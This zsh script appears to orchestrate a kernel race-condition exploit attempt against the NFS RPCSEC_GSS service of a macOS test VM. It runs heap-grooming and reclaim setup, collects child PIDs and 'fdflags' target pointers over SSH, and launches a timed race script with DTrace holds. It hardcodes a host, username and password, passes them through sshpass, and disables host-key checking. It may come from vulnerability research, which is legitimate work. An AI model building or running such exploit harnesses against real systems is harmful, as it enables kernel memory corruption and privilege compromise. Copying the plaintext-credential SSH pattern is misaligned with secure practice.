#!/bin/zsh

set -eu
set -o pipefail

setup_id=${1:?usage: $0 setup_id race_id data_stagger_us [replacement_ctx_init_hold_ns [predictor_sequence_offset [candidate_min_aes_mic [predictor_header_offset [replacement_destroy_hold_ns [race_data_count]]]]]]}
race_id=${2:?usage: $0 setup_id race_id data_stagger_us [replacement_ctx_init_hold_ns [predictor_sequence_offset [candidate_min_aes_mic [predictor_header_offset [replacement_destroy_hold_ns [race_data_count]]]]]]}
data_stagger_us=${3:?usage: $0 setup_id race_id data_stagger_us [replacement_ctx_init_hold_ns [predictor_sequence_offset [candidate_min_aes_mic [predictor_header_offset [replacement_destroy_hold_ns [race_data_count]]]]]]}
replacement_ctx_init_hold_ns=${4:-0}
predictor_sequence_offset=${5:-1}
candidate_min_aes_mic=${6:-2}
predictor_header_offset=${7:-$(( predictor_sequence_offset * 2 ))}
replacement_destroy_hold_ns=${8:-0}
race_data_count=${9:-4}
continue_release_mode=${RPC_GSS_PREFORK_CONTINUE_RELEASE_MODE:-staged_direct}
selective_release_mode=${RPC_GSS_PREFORK_SELECTIVE_RELEASE_MODE:-tight}
selective_release_delay=${RPC_GSS_PREFORK_SELECTIVE_RELEASE_DELAY:-0.005}
mic_hold_ns=${RPC_GSS_PREFORK_MIC_HOLD_NS:-100000000}
prefork_workers=${RPC_GSS_PREFORK_WORKERS:-8}
prefork_selections=${RPC_GSS_PREFORK_SELECTIONS:-16}
predictor_workers=${RPC_GSS_PREDICTOR_WORKERS:-8}
predictor_min_dword=${RPC_GSS_PREFORK_PREDICTOR_MIN_DWORD:-2}
predictor_max_dword=${RPC_GSS_PREFORK_PREDICTOR_MAX_DWORD:-8}
repair_continue_count=${RPC_GSS_PREFORK_REPAIR_CONTINUE_COUNT:-1}
repair_continue_delay_us=${RPC_GSS_PREFORK_REPAIR_CONTINUE_DELAY_US:-0}
repair_continue_stagger_us=${RPC_GSS_PREFORK_REPAIR_CONTINUE_STAGGER_US:-0}
repair_on_fdflags_exact=${RPC_GSS_PREFORK_REPAIR_ON_FDFLAGS_EXACT:-1}
cchmac_return_hold_ns=${RPC_GSS_PREFORK_CCHMAC_RETURN_HOLD_NS:-498000000}
fixed_sequence=${RPC_GSS_PREFORK_FIXED_SEQUENCE:-}
candidate_any_target_outer=${RPC_GSS_PREFORK_CANDIDATE_ANY_TARGET_OUTER:-0}
reuse_setup=${RPC_GSS_PREFORK_REUSE_SETUP:-0}
socket_timeout_seconds=${RPC_GSS_PREFORK_SOCKET_TIMEOUT_SECONDS:-${RPC_GSS_SOCKET_TIMEOUT_SECONDS:-5}}

host=192.168.64.84
user=testtest
password=test
root=/Users/dawgyg/codex_scratch/nfs_beta4_static_20260727
setup_script=${root}/setup_voucher32_fdflags_beta4.sh
race_script=${root}/run_cross_digest_acl_fdflags_beta4.sh
dtrace_script=${RPC_GSS_PREFORK_DTRACE_SCRIPT:-${root}/trace_cross_digest_acl_fdflags_beta4_attempt540.d}
map_log=${root}/voucher_selective_attempt${setup_id}.map
run_id=cross_digest_acl_fdflags_beta4_attempt${race_id}
run_log=${root}/${run_id}.run.log
release_port=$((19000 + race_id))
remote_pid_file=/Users/testtest/v32_select_pids.active
acl_target=/Users/testtest/acl_inherit_oracle/child.attempt${race_id}

ssh_opts=(
	-o ControlMaster=no
	-o ConnectTimeout=15
	-o StrictHostKeyChecking=no
	-o UserKnownHostsFile=/dev/null
	-o IdentitiesOnly=yes
	-o PubkeyAuthentication=yes
	-o PreferredAuthentications=publickey,keyboard-interactive,password
	-o KbdInteractiveAuthentication=yes
	-o PasswordAuthentication=yes
)

if [[ "${setup_id}" != <-> || "${race_id}" != <-> ||
    "${data_stagger_us}" != <-> ||
    "${replacement_ctx_init_hold_ns}" != <-> ||
    "${predictor_sequence_offset}" != <-> ||
    "${candidate_min_aes_mic}" != <-> ||
    "${predictor_header_offset}" != <-> ||
    "${replacement_destroy_hold_ns}" != <-> ||
	    "${race_data_count}" != <-> ||
	    "${mic_hold_ns}" != <-> ||
	    "${prefork_workers}" != <-> ||
	    "${prefork_selections}" != <-> ||
		    "${predictor_workers}" != <-> ||
		    "${predictor_min_dword}" != <-> ||
		    "${predictor_max_dword}" != <-> ||
		    "${repair_continue_count}" != <-> ||
		    "${repair_continue_delay_us}" != <-> ||
	    "${repair_continue_stagger_us}" != <-> ]]; then
	print -u2 "attempt IDs, stagger, and hold must be unsigned integers"
	exit 2
fi
if [[ -n "${fixed_sequence}" &&
    ( "${fixed_sequence}" != <-> ||
    "${fixed_sequence}" -lt 1 ||
    "${fixed_sequence}" -gt 2147483648 ) ]]; then
	print -u2 "invalid fixed RPCSEC_GSS sequence"
	exit 2
fi
if [[ "${repair_on_fdflags_exact}" != 0 &&
    "${repair_on_fdflags_exact}" != 1 ]]; then
	print -u2 "invalid exact-fdflags repair mode"
	exit 2
fi
if [[ "${candidate_any_target_outer}" != 0 &&
    "${candidate_any_target_outer}" != 1 ]]; then
	print -u2 "invalid candidate-any-target-outer selector"
	exit 2
fi
if [[ "${reuse_setup}" != 0 && "${reuse_setup}" != 1 ]]; then
	print -u2 "invalid setup reuse selector"
	exit 2
fi
if [[ "${socket_timeout_seconds}" != <-> ||
    "${socket_timeout_seconds}" -lt 1 ||
    "${socket_timeout_seconds}" -gt 120 ]]; then
	print -u2 "invalid socket timeout"
	exit 2
fi
if [[ "${selective_release_mode}" != tight &&
    "${selective_release_mode}" != dtrace ]]; then
	print -u2 "invalid selective release mode"
	exit 2
fi
if (( data_stagger_us > 1000000 ||
    replacement_ctx_init_hold_ns > 400000000 ||
    replacement_destroy_hold_ns > 499000000 ||
    predictor_sequence_offset > 3 ||
    predictor_header_offset > 32 ||
    race_data_count < 1 || race_data_count > 4 ||
	    mic_hold_ns < 1000000 || mic_hold_ns > 500000000 ||
	    prefork_workers < 4 || prefork_workers > 24 ||
	    prefork_selections < 1 || prefork_selections > 32 ||
	    predictor_workers < 1 || predictor_workers > 32 ||
	    predictor_min_dword < 1 ||
	    predictor_max_dword < predictor_min_dword ||
	    predictor_max_dword > 128 ||
	    cchmac_return_hold_ns < 1000000 ||
	    cchmac_return_hold_ns > 499000000 ||
	    repair_continue_count > 8 ||
	    repair_continue_delay_us > 1000000 ||
	    repair_continue_stagger_us > 1000000 ||
	    repair_continue_count * repair_continue_stagger_us > 5000000 ||
	    candidate_min_aes_mic < 1 || candidate_min_aes_mic > 4 )); then
	print -u2 "stagger or replacement hold is outside the supported range"
	exit 2
fi

if (( reuse_setup == 0 )); then
	sshpass -p "${password}" ssh "${ssh_opts[@]}" "${user}@${host}" \
		"rmdir '${acl_target}' 2>/dev/null || true"

	env VOUCHER32_SETUP_PREFORK_RECLAIM=1 \
		VOUCHER32_SETUP_TIGHT_ACL_RECLAIM=1 \
		VOUCHER32_SETUP_TIGHT_DRAIN_COUNT="${VOUCHER32_SETUP_TIGHT_DRAIN_COUNT:-64}" \
		VOUCHER32_SETUP_TIGHT_BOUNCE_COUNT="${VOUCHER32_SETUP_TIGHT_BOUNCE_COUNT:-0}" \
		VOUCHER32_SETUP_TIGHT_SACRIFICE_COUNT="${VOUCHER32_SETUP_TIGHT_SACRIFICE_COUNT:-2}" \
		VOUCHER32_SETUP_ACL_TARGET="${acl_target}" \
		"${setup_script}" "${host}" "${prefork_workers}" 512 "${map_log}" mkdir \
		"${prefork_selections}"

	sleep 12
elif [[ ! -s "${map_log}" ]]; then
	print -u2 "missing reusable setup map: ${map_log}"
	exit 1
fi

child_map=$(
	sshpass -p "${password}" ssh "${ssh_opts[@]}" "${user}@${host}" \
	    'for p in $(cat /Users/testtest/v32_select_pids); do
	        c=$(pgrep -P "$p" | head -1)
	        test -n "$c"
	        printf "%s %s\n" "$p" "$c"
	    done'
)

typeset -A child_by_parent
while read -r parent child; do
	child_by_parent[${parent}]=${child}
done <<<"${child_map}"

typeset -a parents children flags env_args
while read -r parent flag_ptr; do
	child=${child_by_parent[${parent}]:-}
	if [[ -z "${child}" ]]; then
		print -u2 "missing forked fdflags child for parent ${parent}"
		exit 1
	fi
	if [[ "${flag_ptr}" != 0x* ]]; then
		flag_ptr=0x${flag_ptr}
	fi
	parents+=("${parent}")
	children+=("${child}")
	flags+=("${flag_ptr}")
done < <(
	awk '
	    $1 == "selected" && $2 == "FD_TARGET" && selected < 8 {
	        parent = flags = ""
	        for (i = 1; i <= NF; i++) {
	            split($i, pair, "=")
	            if (pair[1] == "parent_pid") parent = pair[2]
	            if (pair[1] == "flags") flags = pair[2]
	        }
	        if (parent != "" && flags != "") {
	            print parent, flags
	            selected++
	        }
	    }
	' "${map_log}"
)

if (( ${#parents[@]} == 0 || ${#parents[@]} > 8 )); then
	print -u2 "invalid exact-placement count: ${#parents[@]}"
	exit 1
fi

printf '%s\n' "${parents[@]}" |
	sshpass -p "${password}" ssh "${ssh_opts[@]}" "${user}@${host}" \
	    "cat > '${remote_pid_file}'"

env_args=(
	RPC_GSS_VM_USER=${user}
	RPC_GSS_DTRACE_SCRIPT=${dtrace_script}
	RPC_GSS_PREDICTOR_MIN_DWORD=${predictor_min_dword}
	RPC_GSS_PREDICTOR_MAX_DWORD=${predictor_max_dword}
	RPC_GSS_PREDICTOR_CONTEXT=${RPC_GSS_PREFORK_PREDICTOR_CONTEXT:-aes}
	RPC_GSS_PREDICTOR_SEQUENCE_OFFSET=${predictor_sequence_offset}
	RPC_GSS_PREDICTOR_WORKERS=${predictor_workers}
	RPC_GSS_PREDICTOR_HEADER_OFFSET=${predictor_header_offset}
	RPC_GSS_PREDICTOR_MAX_SEQUENCE=2147483647
	RPC_GSS_REPLACEMENT_CTX_INIT_HOLD_NS=${replacement_ctx_init_hold_ns}
	RPC_GSS_REPLACEMENT_DESTROY_HOLD_NS=${replacement_destroy_hold_ns}
	RPC_GSS_REPAIR_ON_FDFLAGS_EXACT=${repair_on_fdflags_exact}
	RPC_GSS_CCHMAC_RETURN_HOLD_NS=${cchmac_return_hold_ns}
	RPC_GSS_CANDIDATE_ANY_TARGET_OUTER=${candidate_any_target_outer}
	RPC_GSS_SOCKET_TIMEOUT_SECONDS=${socket_timeout_seconds}
	RPC_GSS_FDFLAGS_TARGET_PTR=${flags[1]}
	RPC_GSS_FDFLAGS_TARGET_PID=${children[1]}
	RPC_GSS_FDFLAGS_PARENT_PID=${parents[1]}
)

for index in $(seq 1 ${#parents[@]}); do
	env_args+=(
	    "RPC_GSS_FDFLAGS_MAP${index}_PARENT_PID=${parents[index]}"
	    "RPC_GSS_FDFLAGS_MAP${index}_CHILD_PID=${children[index]}"
	    "RPC_GSS_FDFLAGS_MAP${index}_PTR=${flags[index]}"
	)
done

print "cohort setup_id=${setup_id} placements=${#parents[@]} child_map=${child_map//$'\n'/,}"
env "${env_args[@]}" \
	"${race_script}" "${run_id}" "${release_port}" \
	0 0 1 neighbor "${continue_release_mode}" 8 mkdir remote 0 \
		"${fixed_sequence}" 0 "${remote_pid_file}" write 1 0 \
		"${selective_release_mode}" \
		"${selective_release_delay}" \
		"${repair_continue_count}" "${repair_continue_delay_us}" \
		"${repair_continue_stagger_us}" \
	"${race_data_count}" "${data_stagger_us}" dtrace 0 \
	"${candidate_min_aes_mic}" "${mic_hold_ns}" \
	2>&1 | tee "${run_log}"
